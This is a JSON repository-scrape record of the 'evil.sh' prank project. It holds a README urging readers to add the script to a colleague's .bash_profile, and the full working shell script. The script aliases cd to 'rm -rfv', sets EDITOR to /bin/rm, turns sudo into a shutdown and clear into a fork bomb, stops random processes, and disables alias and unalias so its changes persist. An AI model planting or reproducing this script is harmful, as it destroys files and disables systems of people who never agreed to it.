@@ -1,0 +1,42 @@
+{
+  "metadata": {
+    "timestamp": 1736568382365,
+    "page": 322,
+    "hasNextPage": true,
+    "endCursor": "Y3Vyc29yOjMzMA==",
+    "completionStatus": "IN_PROGRESS"
+  },
+  "repositories": [
+    {
+      "nameWithOwner": "mathiasbynens/evil.sh",
+      "stars": 2168,
+      "defaultBranch": "master",
+      "files": [
+        {
+          "name": ".gitattributes",
+          "type": "blob",
+          "size": 0.07421875,
+          "content": "# Automatically normalize line endings for all text-based files\n* text=auto\n"
+        },
+        {
+          "name": ".gitignore",
+          "type": "blob",
+          "size": 0.1611328125,
+          "content": "# Folder view configuration files\n.DS_Store\nDesktop.ini\n\n# Thumbnail cache files\n._*\nThumbs.db\n\n# Files that might appear on external disks\n.Spotlight-V100\n.Trashes\n"
+        },
+        {
+          "name": "README.md",
+          "type": "blob",
+          "size": 1.4453125,
+          "content": "# `evil.sh` (aka. `devili.sh`)\n\nA collection of various subtle and not-so-subtle shell tweaks that will slowly drive people insane.\n\nFeel like trolling a colleague? Just add `source ~/evil.sh` to their `.bash_profile` and watch the chaos ensue.\nBe aware that the sourcing should happen at the end of the file, if you do not edit `evil.sh` before doing so, as `evil.sh` disables `alias` and `unalias`.\n\n## Contributions\n\nEvil suggestions and pull requests are welcome. The only rule is that nothing obviously destructive happens the moment `evil.sh` is sourced. Subtle, annoying tweaks that only take effect when the victim performs a certain action are fine. On the other hand, a patch that adds `rm -rfv /` to `evil.sh` will be rejected.\n\n## See also\n\n* [`evil.js`](https://web.archive.org/web/20190222132600/https://github.com/kitcambridge/evil.js)\n* [`evil.css`](https://github.com/tlrobinson/evil.css)\n\n## Credits\n\n| [![twitter/mathias](https://gravatar.com/avatar/24e08a9ea84deb17ae121074d0f17125?s=70)](https://twitter.com/mathias \"Follow @mathias on Twitter\") | [![twitter/janmoesen](https://gravatar.com/avatar/f0e6c7e4835c71c987b13e0dc4ed3a72?s=70)](https://twitter.com/janmoesen \"Follow @janmoesen on Twitter\") |\n|---|---|\n| [Mathias Bynens](https://mathiasbynens.be/) | [Jan Moesen](http://jan.moesen.nu/) |\n\n## License\n\nPublic domain.\n\n## Obligatory disclaimer\n\n`evil.sh` is purely for entertainment purposes. I’m not responsible for anything you do with `evil.sh`.\n"
+        },
+        {
+          "name": "evil.sh",
+          "type": "blob",
+          "size": 3.966796875,
+          "content": "#!/usr/bin/env bash\n# evil.sh — https://mths.be/evil.sh\n\n# valid values are: insane, annoying, destructive, devasting, unusable\n# each mode of operation includes the previous one's tweaks\n#\n# insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit\n#   open a new shell\n# annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong\n#   (random) directory\n# destructive: delete files and do serious harm, non-recoverable damage included\n# devasting: may delete /\n# unusable: enable everything including, but not limited to replacing enter by backspace\nEVIL_BEHAVIOUR=annoying\n\nfunction insane()\n{\n\tannoying || test \"$EVIL_BEHAVIOUR\" = \"insane\"\n}\n\nfunction annoying()\n{\n\tdestructive || test \"$EVIL_BEHAVIOUR\" = \"annoying\"\n}\n\nfunction destructive()\n{\n\tdevasting || test \"$EVIL_BEHAVIOUR\" = \"destructive\"\n}\n\nfunction devasting()\n{\n\tunusable || test \"$EVIL_BEHAVIOUR\" = \"devasting\"\n}\n\nfunction unusable()\n{\n\ttest \"$EVIL_BEHAVIOUR\" = \"unusable\"\n}\n\n# Set `rm` as the default editor.\ndestructive && export EDITOR=/bin/rm;\n\n# Make Tab send the delete key.\ninsane && tset -Qe $'\\t';\n\n# Randomly make the shell exit whenever a command has a non-zero exit status.\nif insane\nthen\n\t((RANDOM % 10)) || set -o errexit;\nfi\n\n# Let `cat` swallow every input and never return anything.\nannoying && alias cat=true;\n\n# Use a random sort option whenever `ls` is invoked.\nannoying && function ls { command ls -$(opts=\"frStu\"; echo ${opts:$((RANDOM % ${#opts})):1}) \"$@\"; }\n\n# Delete directories instead of entering them.\ndevasting && alias cd='rm -rfv';\n\n# Shut down the computer instead of running a command with super-user rights.\ndestructive && alias sudo='sudo shutdown -P now';\n\n# Launch a fork bomb instead of clearing the screen.\ndestructive && alias clear=':(){ :|:& };:';\n\n# Have `date` return random dates.\nannoying && alias date='date -d \"now + $RANDOM days\"';\n\n# Sometimes, wait a few minutes and then start randomly ejecting the CD drive.\n# Other times, resist all attempts at opening it. Other times, make it read\n# reaaaalllly sllooowwwwllly.\nannoying && if [ \"$(uname)\" = 'Darwin' ]; then\n\t# Much less fun on Macs, alas.\n\tif [[ $[$RANDOM % 2] == 0 ]]; then\n\t\t# Eject!\n\t\tsh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &\n\telse\n\t\t# Lock! Admittedly, much less annoying on most Macs,\twhich don’t support\n\t\t# locking and are slot-loading anyway.\n\t\tsh -c 'while :; do drutil tray close; sleep 0.1s; done' > /dev/null 2>&1 &\n\tfi;\nelse\n\tN=$[$RANDOM % 3];\n\tif [[ $N == 0 ]]; then\n\t\t# Open and close randomly after a few minutes.\n\t\tsh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &\n\telif [[ $N == 1 ]]; then\n\t\t# Lock, and keep closing just in case.\n\t\tsh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &\n\telse\n\t\t# Slowness (1× CD speed). This has to be in a loop because it resets with\n\t\t# every ejection.\n\t\tsh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &\n\tfi;\nfi;\n\n# Send STOP signal to random process at random time.\ndestructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &\n\n# Have `cp` perform `mv` instead.\ndestructive && alias cp='mv';\n\n# Make `exit` open a new shell.\nannoying && alias exit='sh';\n\n# Add a random number to line numbers when using `grep -n`.\ninsane && function grep { command grep \"$@\" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = \"\"; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o \":\" substr($0, 2)}'; }\n\n# Invert `if`, `for`, and `while`.\nannoying && alias if='if !' for='for !' while='while !';\n\n# Map Enter, Ctrl+J, and Ctrl+M to backspace.\nunusable && bind '\"\\C-J\":\"\\C-?\"';\nunusable && bind '\"\\C-M\":\"\\C-?\"';\n\n# Send `n` (no) instead of `y` (yes)\nannoying && alias yes=\"yes n\";\n\n# Quit vim on startup.\nannoying && alias vim=\"vim +q\";\n\n# Disable `unalias` and `alias`.\nalias unalias=false;\nalias alias=false;\n"
+        }
+      ]
+    }
+  ]
+}
